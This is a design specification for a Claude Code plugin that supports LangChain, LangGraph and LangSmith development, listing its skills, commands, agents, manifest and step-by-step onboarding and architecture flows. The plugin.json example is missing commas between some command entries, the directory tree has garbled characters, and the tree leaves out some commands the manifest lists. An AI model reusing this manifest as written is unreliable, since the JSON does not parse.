# langchain-lab Plugin Design Spec

**Version:** 1.0.0
**Author:** langchain-lab contributors
**Status:** AUTHORITATIVE — build workflow uses this as ground truth

---

## Overview

`langchain-lab` is a Claude Code plugin for LangChain, LangGraph, and LangSmith development. It provides two journey skills that onboard and architect new projects, eleven domain skills covering every major subsystem (agents, graphs, RAG, memory, tools, LCEL, deployment, testing, debugging, monitoring, and context engineering), seven slash commands for scaffolding, documentation lookup, tracing injection, code review, concept explanation, pattern selection, and upgrade assistance, and four specialist agents (architect, coder, reviewer, docs-agent) that can be delegated to from skills or invoked directly.

All generated code targets:
- Python 3.11+
- LangChain 0.3.x / langchain-core 0.3.x
- LangGraph 1.2.x
- LangSmith SDK 0.2.x
- claude-sonnet-4-6 as the default LLM
- Pydantic v2 only
- LCEL pipe syntax throughout (never LLMChain, AgentExecutor, or legacy chains)

---

## Architecture

The plugin is organized in three layers. Each layer builds on the one below it.

### Layer 1: Journey Skills (entry points)

Journey skills are interactive, multi-step flows that guide a user through a complete task. They ask questions, teach concepts inline, scaffold files, and route to Domain skills when their phase is complete. There are two journey skills.

- **lc:start** — Full onboarding: goal selection, project scaffold, dependency installation, first run, LangSmith setup, LCEL introduction, route to domain skill.
- **lc:design-system** — Architecture interview: eight questions, pattern selection decision tree, memory architecture selection, deployment target, spec document output, route to `writing-plans`.

### Layer 2: Domain Skills (deep expertise)

Domain skills are reference + code generation hubs for a single subsystem. They begin with a short discovery flow (2-4 questions), select the right pattern, and produce complete, runnable code. They cross-reference each other.

| Skill | Subsystem |
|---|---|
| lc:agent | ReAct, Supervisor, Plan-and-Execute, Reflection, Send API |
| lc:graph | StateGraph, nodes, edges, checkpointing, interrupts, streaming, subgraphs, Send |
| lc:rag | Naive, Multi-Query, Compression, Self-RAG, CRAG, Agentic RAG, advanced |
| lc:context-engineer | Prompt templates, system prompts, few-shot, structured output, memory management, versioning |
| lc:memory | Buffer, trimming, summary, checkpointing, vector memory, entity, Store API |
| lc:tools | @tool, StructuredTool, error handling, async, ToolNode, toolkits, built-ins, MCP |
| lc:deploy | Local dev, LangGraph Platform, LangServe (legacy), Docker, Kubernetes |
| lc:test | Unit, state, integration, LangSmith eval, custom evaluators, RAG eval, CI/CD |
| lc:debug | Import errors, LLM call errors, LCEL errors, LangGraph errors, async errors |
| lc:monitor | Setup, auto-tracing, manual tracing, production patterns, datasets, online eval, dashboards, Prompt Hub |
| lc:lcel | Runnable interface, pipe composition, core Runnables, branching, error handling, streaming, config, async |

### Layer 3: Utility

Slash commands provide targeted automation without a conversational flow. Specialist agents can be delegated to by any skill via a structured input block.

---

## Plugin Manifest (plugin.json)

```json
{
  "name": "langchain-lab",
  "version": "1.0.0",
  "description": "LangChain, LangGraph, and LangSmith development environment for Claude Code. Onboarding journeys, domain expertise, code scaffolding, tracing injection, upgrade assistance, and specialist agents.",
  "author": "langchain-lab contributors",
  "skills": [
    {
      "name": "lc:start",
      "file": "skills/start.md",
      "description": "Full onboarding journey for new LangChain/LangGraph projects. Guides goal selection, project scaffolding, dependency installation, first run, LangSmith setup, and LCEL introduction.",
      "invocation": ["lc:start", "/lc-start", "start a langchain project", "new langchain project", "get started with langchain", "langchain tutorial", "langchain hello world"]
    },
    {
      "name": "lc:design-system",
      "file": "skills/design-system.md",
      "description": "Architecture interview and pattern selection for LangChain/LangGraph systems. Produces a complete spec document and routes to writing-plans.",
      "invocation": ["lc:design-system", "/lc-design", "design a langchain system", "architect a langchain app", "what pattern should I use", "help me design my agent"]
    },
    {
      "name": "lc:agent",
      "file": "skills/lc-agent/SKILL.md",
      "description": "LangGraph agent patterns: ReAct, Supervisor multi-agent, Plan-and-Execute, Reflection/self-critique, and parallel Send API fan-out.",
      "invocation": ["lc:agent", "/lc-agent", "build an agent", "react agent", "supervisor agent", "multi-agent", "plan and execute", "langgraph agent"]
    },
    {
      "name": "lc:graph",
      "file": "skills/graph.md",
      "description": "Complete LangGraph StateGraph guide: state schemas, nodes, edges, checkpointing, interrupts, streaming, subgraphs, and Send API.",
      "invocation": ["lc:graph", "/lc-graph", "build a langgraph graph", "stategraph", "langgraph nodes", "langgraph edges", "langgraph checkpointing"]
    },
    {
      "name": "lc:rag",
      "file": "skills/rag/SKILL.md",
      "description": "RAG pipeline patterns from naive retrieval through Self-RAG, CRAG, and agentic RAG. Includes LangSmith evaluation harness.",
      "invocation": ["lc:rag", "/lc-rag", "rag pipeline", "retrieval augmented generation", "document qa", "semantic search", "vector search chain"]
    },
    {
      "name": "lc:context-engineer",
      "file": "skills/context-engineer.md",
      "description": "Prompt template authorship, system prompt design, few-shot examples, structured output, context window management, and Prompt Hub versioning.",
      "invocation": ["lc:context-engineer", "/lc-context", "prompt engineering", "prompt template", "system prompt", "few shot examples", "structured output"]
    },
    {
      "name": "lc:memory",
      "file": "skills/lc-memory/SKILL.md",
      "description": "Conversation memory patterns: buffer, trimming, summary, checkpointing, vector memory, entity tracking, and cross-thread Store API.",
      "invocation": ["lc:memory", "/lc-memory", "conversation memory", "chat history", "checkpointer", "memorysaver", "long term memory"]
    },
    {
      "name": "lc:tools",
      "file": "skills/lc-tools/SKILL.md",
      "description": "Custom tool creation: @tool decorator, StructuredTool, async tools, ToolNode in LangGraph, toolkits, built-in tools, and MCP integration.",
      "invocation": ["lc:tools", "/lc-tools", "create a tool", "langchain tool", "toolnode", "mcp tools", "langchain toolkit"]
    },
    {
      "name": "lc:deploy",
      "file": "skills/lc-deploy/SKILL.md",
      "description": "Deployment guides for LangGraph apps: local dev server, LangGraph Platform, LangServe (legacy), Docker, and Kubernetes.",
      "invocation": ["lc:deploy", "/lc-deploy", "deploy langchain", "deploy langgraph", "langgraph platform", "langserve", "docker langchain"]
    },
    {
      "name": "lc:test",
      "file": "skills/lc-test/SKILL.md",
      "description": "Testing strategy for LangChain/LangGraph: unit tests with fake LLMs, graph state testing, integration tests, LangSmith evaluation datasets, and CI/CD gates.",
      "invocation": ["lc:test", "/lc-test", "test langchain", "test langgraph", "langsmith evaluation", "eval dataset", "llm testing"]
    },
    {
      "name": "lc:debug",
      "file": "skills/lc-debug/SKILL.md",
      "description": "Debugging guide for LangChain/LangGraph: import errors, LLM call failures, LCEL chain errors, LangGraph state bugs, async issues, and a quick-lookup error table.",
      "invocation": ["lc:debug", "/lc-debug", "debug langchain", "langchain error", "langgraph error", "traceback langchain", "fix langchain bug"]
    },
    {
      "name": "lc:monitor",
      "file": "skills/lc-monitor/SKILL.md",
      "description": "LangSmith monitoring: setup, automatic and manual tracing, production patterns, dataset evaluation, online evaluation, dashboards, and Prompt Hub A/B testing.",
      "invocation": ["lc:monitor", "/lc-monitor", "langsmith tracing", "langsmith monitoring", "trace my agent", "langsmith dashboard", "llm observability"]
    },
    {
      "name": "lc:lcel",
      "file": "skills/lc-lcel/SKILL.md",
      "description": "LangChain Expression Language deep dive: Runnable interface, pipe composition, RunnablePassthrough/Parallel/Lambda/Branch, streaming, retry/fallback, configurable fields, and async patterns.",
      "invocation": ["lc:lcel", "/lc-lcel", "lcel", "langchain pipe", "runnable", "runnablepassthrough", "runnableparallel", "lcel chain"]
    }
  ],
  "commands": [
    {
      "name": "lc-scaffold",
      "file": "skills/lc-scaffold/SKILL.md",
      "description": "Scaffold LangChain/LangGraph project files. Menu-driven if no type given.",
      "argument-hint": "[project|agent|graph|rag|tool|chain|evaluator|dockerfile|langgraph-config]"
    },
    {
      "name": "lc-docs",
      "file": "skills/lc-docs/SKILL.md",
      "description": "Fetch live LangChain/LangGraph/LangSmith documentation via Context7 and synthesize a structured answer.",
      "argument-hint": "<topic>"
    },
    {
      "name": "lc-trace",
      "file": "skills/lc-trace/SKILL.md",
      "description": "Inject LangSmith tracing into an existing Python file. Detects components and applies correct tracing transformation.",
      "argument-hint": "<file.py>"
    },
    {
      "name": "lc-review",
      "file": "commands/lc-review.md",
      "description": "Review a LangChain/LangGraph Python file across 5 dimensions: correctness, best practices, performance, common pitfalls, and production readiness.",
      "argument-hint": "[file.py]"
    },
    {
      "name": "lc-explain",
      "file": "skills/lc-explain/SKILL.md",
      "description": "Explain a LangChain/LangGraph concept with analogy, code example, and common mistakes.",
      "argument-hint": "<concept>"
    },
    {
      "name": "lc-patterns",
      "file": "skills/lc-patterns/SKILL.md",
      "description": "Recommend the right LangChain/LangGraph architecture pattern for a described use case.",
      "argument-hint": "[description of your system]"
    },
    {
      "name": "lc-upgrade",
      "file": "commands/lc-upgrade.md",
      "description": "Detect and migrate deprecated LangChain patterns (LLMChain, AgentExecutor, ConversationBufferMemory, LangServe) to modern equivalents.",
      "argument-hint": "[file.py or directory]"
    },
    {
      "name": "lc-ab-test",
      "file": "commands/lc-ab-test.md",
      "description": "Set up a statistical A/B test between two prompt, model, or chain variants using LangSmith evaluation. Interactive wizard; scaffolds ab_test.py, ab_router.py, and RESULTS_TEMPLATE.md.",
      "argument-hint": "[--prompt | --model | --chain]"
    },
    {
      "name": "lc-erase",
      "file": "commands/lc-erase.md",
      "description": "Generate GDPR Article 17 right-to-erasure code for a specific user. Scans for active data stores, emits erase_user.py with delete_user_data(), generates erasure_audit DDL, and shows the 30-day compliance deadline.",
      "argument-hint": "<user_id>"
    },
    {
      "name": "lc-antipatterns",
      "file": "commands/lc-antipatterns.md",
      "description": "Interactive catalog of the 15 most common LangChain/LangGraph production mistakes, each with symptom, root cause, production consequence, and before/after fix. Also scans a file for antipatterns from the catalog.",
      "argument-hint": "[1-15 | keyword | scan <file.py>]"
    }
    {
      "name": "lc-guard",
      "file": "commands/lc-guard.md",
      "description": "Audit a LangGraph graph or LCEL chain for security gaps and generate a guardrails_layer.py wrapper with sanitize_input, CostCircuitBreaker, ToolOutputSanitizer, and PII redaction.",
      "argument-hint": "[file.py]"
    }
    {
      "name": "lc-providers",
      "file": "commands/lc-providers.md",
      "description": "Interactive provider setup wizard — configure LLM providers, generate src/providers.py factory with get_llm(), update .env.example, and optionally swap all provider references in the project.",
      "argument-hint": "[anthropic|openai|azure|bedrock|gemini|ollama|--swap]"
    }
  ],
  "agents": [
    {
      "name": "lc-architect",
      "file": "skills/lc-architect/AGENT.md",
      "description": "Architecture specialist. Produces a ten-section architecture document for complex multi-pattern systems. Invoked by design-system, lc-agent, rag, lc-memory, and feature-dev skills."
    },
    {
      "name": "lc-coder",
      "file": "skills/lc-coder/AGENT.md",
      "description": "Code generation specialist. Writes primary module, test file, and requirements fragment. Enforces 15-item quality checklist. Never emits deprecated APIs."
    },
    {
      "name": "lc-reviewer",
      "file": "skills/lc-reviewer/AGENT.md",
      "description": "Code review specialist. Reviews across 7 dimensions with confidence-tiered findings. Produces MERGE-READY or NEEDS-FIXES verdict."
    },
    {
      "name": "lc-docs-agent",
      "file": "skills/lc-docs/AGENT.md",
      "description": "Documentation retrieval specialist. Resolves topics to Context7 library IDs, fetches live docs, and synthesizes a 6-section structured answer."
    }
  ],
  "hooks": [
    {
      "event": "PostToolUse",
      "matcher": "Write",
      "command": "python -c \"import ast, sys; ast.parse(open('$TOOL_OUTPUT_PATH').read())\" 2>/dev/null || true",
      "description": "Syntax-check any .py file written by the plugin."
    }
  ]
}
```

---

## Project Structure

```
C:/git/langchain/.claude/
â”œâ”€â”€ PLUGIN_SPEC.md                     â† this document
â”œâ”€â”€ settings.local.json
â”œâ”€â”€ commands/
â”‚   â”œâ”€â”€ lc-review.md                   â† /lc-review slash command
â”‚   â”œâ”€â”€ lc-upgrade.md                  â† /lc-upgrade slash command
â”‚   â””â”€â”€ lc-ab-test.md                  â† /lc-ab-test slash command
â””â”€â”€ skills/
    â”œâ”€â”€ start.md                       â† lc:start journey skill
    â”œâ”€â”€ design-system.md               â† lc:design-system journey skill
    â”œâ”€â”€ graph.md                       â† lc:graph domain skill
    â”œâ”€â”€ context-engineer.md            â† lc:context-engineer domain skill
    â”œâ”€â”€ lc-agent/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:agent domain skill
    â”œâ”€â”€ lc-architect/
    â”‚   â””â”€â”€ AGENT.md                   â† lc-architect specialist agent
    â”œâ”€â”€ lc-coder/
    â”‚   â””â”€â”€ AGENT.md                   â† lc-coder specialist agent
    â”œâ”€â”€ lc-debug/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:debug domain skill
    â”œâ”€â”€ lc-deploy/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:deploy domain skill
    â”œâ”€â”€ lc-docs/
    â”‚   â”œâ”€â”€ SKILL.md                   â† lc:docs / /lc-docs command skill
    â”‚   â””â”€â”€ AGENT.md                   â† lc-docs-agent specialist
    â”œâ”€â”€ lc-explain/
    â”‚   â””â”€â”€ SKILL.md                   â† /lc-explain command skill
    â”œâ”€â”€ lc-lcel/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:lcel domain skill
    â”œâ”€â”€ lc-memory/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:memory domain skill
    â”œâ”€â”€ lc-monitor/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:monitor domain skill
    â”œâ”€â”€ lc-patterns/
    â”‚   â””â”€â”€ SKILL.md                   â† /lc-patterns command skill
    â”œâ”€â”€ lc-reviewer/
    â”‚   â””â”€â”€ AGENT.md                   â† lc-reviewer specialist agent
    â”œâ”€â”€ lc-scaffold/
    â”‚   â””â”€â”€ SKILL.md                   â† /lc-scaffold command skill
    â”œâ”€â”€ lc-test/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:test domain skill
    â”œâ”€â”€ lc-tools/
    â”‚   â””â”€â”€ SKILL.md                   â† lc:tools domain skill
    â”œâ”€â”€ lc-trace/
    â”‚   â””â”€â”€ SKILL.md                   â† /lc-trace command skill
    â””â”€â”€ rag/
        â””â”€â”€ SKILL.md                   â† lc:rag domain skill
```

Total expected files: 24 skill/command/agent markdown files + 1 spec + 1 settings file = **26 tracked files**.

---

## Skills

### Journey Layer

#### lc:start

**File:** `skills/start.md`

**Description:** Full onboarding journey for developers new to LangChain/LangGraph. Walks from zero to a running, traced project in 12 sequential steps.

**Trigger / when to invoke:**
- User says "start a langchain project", "new langchain project", "langchain tutorial", "get started with langgraph", "langchain hello world"
- Invoked via `/lc-start` or `lc:start`
- User has no existing project directory

**Full step-by-step execution flow:**

1. **Welcome** — Print plain-English introduction to LangChain (LCEL chains), LangGraph (stateful graphs), and LangSmith (observability). Present 6 goal options with full explanations: (1) Chatbot with memory, (2) RAG document Q&A, (3) ReAct agent with tools, (4) LCEL data pipeline, (5) Multi-agent supervisor, (6) Not sure yet (runs design-system interview). Wait for selection.

2. **Goal-specific orientation** — Print which framework components they will use for their chosen goal. Define every term inline on first use. Include a "What is a Runnable?" block tailored to their path. For LangGraph goals, explain the node/edge/state model with a small ASCII diagram.

3. **Python version check** — Run `python --version` or `python3 --version`. Block if < 3.9 with upgrade instructions. Warn (but continue) if < 3.11. Print confirmation for 3.11+.

4. **Project setup** — Ask for project name (default: `my-lc-project`) and location (default: current directory). Validate name is a valid Python identifier. Confirm before writing.

5. **Scaffold project files** — Write the following files:
   - `pyproject.toml` with hatchling build, pinned deps per goal (langchain-anthropic, langgraph, langsmith, python-dotenv), optional `rag` group (langchain-community, chromadb, sentence-transformers), optional `dev` group (pytest, ruff, mypy)
   - `.env.example` with ANTHROPIC_API_KEY, LANGSMITH_API_KEY, LANGSMITH_TRACING=true, LANGSMITH_PROJECT placeholders
   - `.env` (empty, gitignored)
   - `.gitignore` covering `.env`, `__pycache__`, `.venv`, `*.pyc`, `chroma_db/`
   - `README.md` with project name, goal, and quickstart instructions
   - `src/__init__.py` (empty)
   - `src/hello_world.py` (written in step 6)
   - `tests/__init__.py` (empty)

6. **Write hello_world.py** — One complete, heavily-commented file per goal:
   - **Chatbot:** `ChatAnthropic` + `MessagesState` + `MemorySaver` + `StateGraph` with one LLM node and a loop
   - **RAG:** `WebBaseLoader` â†’ `RecursiveCharacterTextSplitter` â†’ `Chroma` â†’ `RunnablePassthrough` LCEL chain
   - **Agent:** `create_react_agent` with `search_web` and `calculate` stub tools, `MemorySaver`, `astream()` invocation
   - **Pipeline:** `ChatPromptTemplate | ChatAnthropic | StrOutputParser` five-stage LCEL chain with `RunnableParallel`
   - **Multi-agent:** `StateGraph` supervisor with `Researcher` and `Writer` nodes, `langgraph-supervisor` pattern
   All files use `claude-sonnet-4-6`, call `load_dotenv()` first, and include a `print()` so output is visible.

7. **Install dependencies** — Prefer `uv` (check if available), fall back to `pip`. Print platform-specific venv activation commands (Windows: `.venv\Scripts\activate`, Unix: `source .venv/bin/activate`). Run a post-install import check: `python -c "import langchain; import langgraph; import langsmith; print('imports OK')"`.

8. **API key setup** — Walk through getting both keys:
   - Anthropic: `https://console.anthropic.com/settings/keys`
   - LangSmith: `https://smith.langchain.com/settings` (Settings â†’ API Keys)
   Show exact `.env` format. Verify both are populated (read `.env`, check for placeholder values). Block until both are present.

9. **First run** — Execute `python src/hello_world.py`. Check exit code. On success, print the output with a success message. On failure:
   - `AuthenticationError` / 401 â†’ "Check ANTHROPIC_API_KEY in .env"
   - `ModuleNotFoundError` â†’ "Run the install command from step 7"
   - Any other error â†’ show the traceback and suggest `/lc-debug`

10. **LangSmith trace walkthrough** — If `LANGSMITH_TRACING=true` and `LANGSMITH_API_KEY` is set, open `https://smith.langchain.com` and walk through: finding the project, clicking the first trace, reading the inputs/outputs tabs, understanding the metadata tab and latency numbers. Explain why observability matters from day 1.

11. **LCEL introduction** — Teach the Runnable interface. Show old `LLMChain` pattern, then the equivalent LCEL pipe. Explain: streaming works by default, `batch()` is parallelized, `ainvoke()` is async, every step is composable. Show `invoke()`, `stream()`, and `batch()` on the same chain.

12. **Route to domain skill** — Print preview of what the next skill will teach. Route:
    - Chatbot â†’ `lc:memory` (conversation memory patterns)
    - RAG â†’ `lc:rag` (all RAG variants)
    - Agent â†’ `lc:agent` (all agent patterns)
    - Pipeline â†’ `lc:lcel` (full LCEL depth)
    - Multi-agent â†’ `lc:agent` (supervisor pattern)
    - Not sure â†’ `lc:design-system`

**Concepts taught:** LangChain vs LangGraph vs LangSmith, Runnable interface, LCEL pipe syntax, `.env` secrets management, LangSmith auto-tracing.

**Questions asked:** Goal selection (step 1), project name and location (step 4), API key confirmation (step 8).

---

#### lc:design-system

**File:** `skills/design-system.md`

**Description:** Architecture interview that maps a system description to the correct LangChain/LangGraph pattern, memory architecture, and deployment target. Produces a spec document.

**Trigger / when to invoke:**
- User says "design a langchain system", "architect a langchain app", "what pattern should I use", "help me design my agent"
- Invoked from `lc:start` when user selects "Not sure yet"
- Invoked directly via `/lc-design` or `lc:design-system`

**Full step-by-step execution flow:**

**Phase 1 — Open the interview.** Explain what this skill does in two sentences. Set the rule: one question at a time.

**Phase 2 — Eight questions** (each reflects the answer back before proceeding):
1. "Describe what your system should do in 2-3 sentences." â†’ captures `system_description`
2. "What data sources does it read from?" (list options: uploaded files, URLs, databases, APIs, none) â†’ captures `data_sources[]`
3. "Does it need to remember things across conversations?" (yes/no/unsure) â†’ captures `needs_persistence`
4. "Does it call external APIs or run code?" (yes/no) â†’ captures `needs_tools`
5. "Does it search through documents to answer questions?" (yes/no) â†’ captures `needs_rag`
6. "Does it need a human to approve or edit before continuing?" (yes/no) â†’ captures `needs_hitl`
7. "How many users, approximately?" (just me / small team / production) â†’ captures `scale_tier`
8. "Which LLM provider?" (Anthropic/OpenAI/Google/other) â†’ captures `llm_provider`

**Phase 3 — Pattern selection decision tree** (deterministic, top-to-bottom):
1. `needs_hitl=yes` AND `needs_tools=yes` â†’ **LangGraph with interrupt()**
2. `needs_rag=yes` AND `needs_tools=yes` â†’ **Agentic RAG**
3. Multiple distinct domains in `system_description` AND `needs_tools=yes` â†’ **Supervisor Multi-Agent**
4. Complex multi-step reasoning in `system_description` â†’ **Plan-and-Execute + Checkpointing**
5. `needs_rag=yes` AND `needs_persistence=yes` â†’ **RAG Chain + RunnableWithMessageHistory**
6. `needs_rag=yes` â†’ **RAG Chain**
7. `needs_tools=yes` AND `needs_persistence=yes` â†’ **ReAct Agent**
8. `needs_tools=yes` â†’ **ReAct Agent (no memory)**
9. Default â†’ **Simple LCEL Chain**

**Phase 4 — Memory architecture selection:**
- `needs_persistence=no` â†’ no memory component
- `needs_persistence=yes` AND `scale_tier=just me` â†’ `MemorySaver`
- `needs_persistence=yes` AND `scale_tier=small team` â†’ `SqliteSaver` or `AsyncPostgresSaver`
- `needs_persistence=yes` AND `scale_tier=production` â†’ `AsyncPostgresSaver` with connection pool
- `needs_rag=yes` â†’ add vector store (Chroma for dev, Pinecone/Qdrant for prod)
- High token costs expected â†’ add semantic cache

**Phase 5 — Deployment target selection:**
- `scale_tier=just me` â†’ local script
- `scale_tier=small team` AND `needs_hitl=no` â†’ LangServe or `langgraph dev`
- `scale_tier=production` OR `needs_hitl=yes` â†’ LangGraph Platform or self-hosted LangGraph Server

**Phase 6 — Spec document** written to `docs/specs/YYYY-MM-DD-<system-name>-spec.md`:
1. System Overview (one paragraph)
2. ASCII Architecture Diagram
3. State Schema (TypedDict with all fields and annotations)
4. Components table (nodes, chains, tools, edges with descriptions)
5. Data Flow narrative (numbered steps)
6. Memory Architecture (component choice with rationale)
7. Deployment Target (with env vars table)
8. Testing Strategy (unit/integration/LangSmith eval/HITL)
9. Open Questions (checklist)
10. Implementation Order (seed for `writing-plans`)

**Phase 7 — Confirm and route.** Print a decision summary block. If complexity exceeds two patterns or 3+ domains, delegate to `lc-architect` agent. Otherwise route to `writing-plans` skill with the spec file path.

**Guardrails:** Ambiguous answers â†’ ask one follow-up. Conflicting signals â†’ explain the conflict and ask one resolution question. "I don't know" â†’ offer three common defaults for that axis.

---

### Domain Layer

#### lc:agent

**File:** `skills/lc-agent/SKILL.md`

**Description:** LangGraph agent patterns with complete, runnable code for five architectures.

**Discovery flow (8 questions):**
1. What should the agent accomplish?
2. Does it need external tools? What kind?
3. Does it need to remember conversations across sessions?
4. Does a human need to approve actions?
5. Does it need to plan before acting?
6. Does it need multiple specialized roles?
7. Does it need to self-critique or retry its outputs?
8. Does it need to process many items in parallel?

**Pattern selection table:**

| Signal | Pattern |
|---|---|
| tools + memory | ReAct Agent |
| tools + human approval | ReAct + interrupt() |
| tools + planning | Plan-and-Execute |
| 3+ specialized roles | Supervisor Multi-Agent |
| quality thresholds | Reflection/Self-Critique |
| parallel processing | Send API fan-out |

**Five patterns with complete code:**

1. **ReAct Agent** — `MessagesState`, `ToolNode`, `should_continue` routing function, `MemorySaver` default with `PostgresSaver` comment swap, `astream()` token streaming, `interrupt_before=["tools"]` human-in-the-loop variant, `recursion_limit=25` on compile, full pytest test suite with `FakeListChatModel`.

2. **Supervisor Multi-Agent** — `create_supervisor` from `langgraph-supervisor`, three named specialists (researcher/analyst/writer), domain-isolated tools per specialist, proper `name` field in `ChatAnthropic` for routing, multi-level hierarchy example, routing tests.

3. **Plan-and-Execute** — `PlanExecuteState` TypedDict with `past_steps: Annotated[list, operator.add]`, `with_structured_output(Plan)` / `with_structured_output(Act)` / `with_structured_output(Response)`, planner/executor/replanner nodes, conditional termination on `Response` type.

4. **Reflection/Self-Critique** — generator node, critic node returning structured `Critique(score: float, feedback: str)`, reviser node, dual termination: `score >= 0.8` OR `iteration_count >= 3`, `iteration_count` as state field with `operator.add`.

5. **Parallel Send API** — `OverallState` with `results: Annotated[list, operator.add]`, `WorkerState` for isolation, `fan_out_to_workers` returning `list[Send]`, `reduce_results` aggregation step.

**Supporting sections:** environment setup with all pip installs, LangSmith env var reference, 11-entry common mistakes table, 15-line minimal ReAct cheat sheet, streaming snippet, HITL snippet.

---

#### lc:graph

**File:** `skills/graph.md`

**Description:** Complete LangGraph StateGraph guide from first principles through production patterns.

**10-phase interactive flow:**

Phase 1 — Goal gathering (what graph to build, experience level)

Phase 2 — **State schema:** TypedDict vs Pydantic BaseModel trade-offs, `add_messages` and deduplication by `id`, `MessagesState` shorthand, `operator.add` for list aggregation, custom reducer functions, Input/Output schema separation, 5 ready-made schema examples.

Phase 3 — **Nodes:** sync and async function signatures, partial-state returns (only return changed keys), `Command` objects for update+routing (LangGraph 1.2+), LLM calls with `with_structured_output`, manual tool execution vs `ToolNode` parallel behavior, error handling with retry counters in state.

Phase 4 — **Edges:** direct edges, `add_conditional_edges` with mapping dict, router function patterns with `Literal` type hints, `tools_condition` prebuilt, multiple entry points, canonical ReAct loop pattern.

Phase 5 — **Checkpointing:** `MemorySaver`/`InMemorySaver` for dev, `SqliteSaver` sync/async for light persistence, `AsyncPostgresSaver` with connection pool and `setup()`, `thread_id` scoping strategies, `get_state_history()` / `update_state()` for time-travel.

Phase 6 — **Interrupts:** static `interrupt_before`/`interrupt_after`, dynamic `interrupt()` inside a node, re-execution-from-top semantics, `Command(resume=...)` to surface results, multi-turn stream loop pattern, state editing during pause, HITL use-case table.

Phase 7 — **Streaming:** all four `stream_mode` values (`values`, `updates`, `messages`, `debug`) with examples, combining modes, custom events via `get_stream_writer()`, `astream_events` for sub-node granularity.

Phase 8 — **Subgraphs:** when to use them, automatic channel mapping by name, compiling without a checkpointer, `Command.PARENT` for routing back to parent.

Phase 9 — **Send API:** dynamic fan-out, `operator.add` reducer as the collect step, comparison table of Send vs fixed parallel nodes, mixed return type from conditional edge.

Phase 10 — **Full scaffold:** single complete Python file with all imports, state, tools, nodes, graph builder, checkpointer wiring, and three invocation patterns (sync, streaming, HITL).

---

#### lc:rag

**File:** `skills/rag/SKILL.md`

**Description:** RAG pipeline patterns from naive retrieval through advanced agentic RAG.

**Discovery flow (4 questions):**
1. Document type (PDF/URL/directory/database)?
2. Query complexity (simple lookup / multi-hop / ambiguous)?
3. Accuracy requirement (best-effort / high-stakes)?
4. Deployment target (local / production API)?

**Decision table:** answers map to one of 8 patterns.

**8 patterns with complete code:**

1. **Naive RAG** — 3-file scaffold: `ingest.py` (loader â†’ splitter â†’ embeddings â†’ vectorstore), `chain.py` (LCEL: `retriever | format_docs | prompt | llm | parser`), `ask.py` (CLI entrypoint). All four loaders shown. `RecursiveCharacterTextSplitter`. Chroma dev, Pinecone/Qdrant prod swap-ins.

2. **Multi-Query RAG** — `MultiQueryRetriever` with default and custom query-generation prompt, automatic deduplication.

3. **Query Transformation** — three sub-patterns: Step-Back (few-shot for broader framing), HyDE (hypothetical document embedding), Query Rewriting (LLM-driven specificity).

4. **Contextual Compression RAG** — `LLMChainExtractor`, `EmbeddingsFilter`, `DocumentCompressorPipeline` with a `compressor_type` switch parameter.

5. **Self-RAG** — LangGraph `StateGraph` with grader nodes (doc relevance, hallucination, answer quality), retry loops capped at 2, Pydantic structured output for each grade.

6. **CRAG** — LangGraph with Tavily web search fallback, relevance/irrelevant/ambiguous grading, conditional routing to web search on local retrieval failure.

7. **Agentic RAG** — RAG as a `@tool` inside a ReAct agent, `ToolNode` + `tools_condition`, plus a decompose-retrieve-synthesize variant for multi-hop.

8. **Advanced Topics** — Multi-Vector (parent-child), Ensemble (BM25 + semantic with tunable weights), Cohere Rerank, Metadata Filtering.

**LangSmith evaluation:** `eval_rag.py` with correctness evaluator using LLM-as-judge, `evaluate()` harness.

**Pattern selection cheat-sheet:** ASCII decision tree mapping (question type, stakes) â†’ pattern.

---

#### lc:context-engineer

**File:** `skills/context-engineer.md`

**Description:** Prompt authorship guide covering templates, system prompts, few-shot, structured output, context window management, and Prompt Hub versioning.

**Four-question decision tree at entry:**
1. Building a template or refining an existing one?
2. Do you need examples in the prompt?
3. Do you need structured JSON/object output?
4. Is context window size a concern?

**Eight topic sections:**
1. **Prompt Templates** — `ChatPromptTemplate.from_messages`, `HumanMessagePromptTemplate`, partial templates, variable validation
2. **System Prompt Authorship** — four-section template (role, context, constraints, output format), checklist, anti-patterns
3. **Few-Shot Examples** — static `FewShotChatMessagePromptTemplate`, dynamic with `example_selector=`, `SemanticSimilarityExampleSelector`
4. **Structured Output** — `model.with_structured_output(PydanticModel)` as primary path, `TypedDict` vs `BaseModel` trade-off table
5. **Context Window Management** — `trim_messages` with `count_tokens_approximately`, `max_tokens` budget strategy
6. **Conversation History** — `RunnableWithMessageHistory` with `input_messages_key` / `history_messages_key`
7. **Prompt Versioning** — `client.push_prompt` / `client.pull_prompt` from `langsmith.Client`, version pinning, A/B test by `user_id` hash
8. **Output Parsers** — `StrOutputParser`, `JsonOutputParser`, `PydanticOutputParser`, `CommaSeparatedListOutputParser`, when to use each

**End-to-end example:** single coherent service wiring all 8 patterns together.

---

#### lc:memory

**File:** `skills/lc-memory/SKILL.md`

**Description:** Seven memory patterns for LangGraph applications with a decision tree entry point.

**Decision tree entry point:** flowchart routing on (persistence needed, token budget concern, cross-thread sharing, entity tracking) to the right pattern.

**Token cost reference table:** rough dollar-cost math per pattern at GPT-4 pricing to justify architectural choices.

**Seven patterns with complete runnable code:**

1. **Conversation Buffer** — `MessagesState` + `add_messages` reducer, for demos and short sessions
2. **Conversation Trimming** — `trim_messages()` with `strategy`, `max_tokens`, `start_on`, `end_on` params
3. **Conversation Summary** — `SummaryState` extending `MessagesState`, `RemoveMessage`, conditional summarize node
4. **Checkpointing** — `InMemorySaver` / `SqliteSaver` / `PostgresSaver` with `thread_id` config pattern and `setup()` call note
5. **Vector Memory** — `InMemoryVectorStore` for dev, Chroma/Qdrant swap-ins, tool-binding pattern
6. **Entity Memory** — JSON profile extraction node, merge logic, system-prompt injection
7. **Store API** — `store.put()` / `store.search()` / namespace conventions, cross-thread user preference sharing

**Combining patterns table:** which patterns compose cleanly vs which conflict.

**Common mistakes table:** 8 entries including "forgot thread_id", "MemorySaver in prod", "mutating state directly".

---

#### lc:tools

**File:** `skills/lc-tools/SKILL.md`

**Description:** Custom tool creation for LangGraph agents, from simple decorators through MCP integration.

**8 patterns + principles:**

1. **@tool decorator** — docstring as LLM prompt, type hints as schema, `return_direct` flag
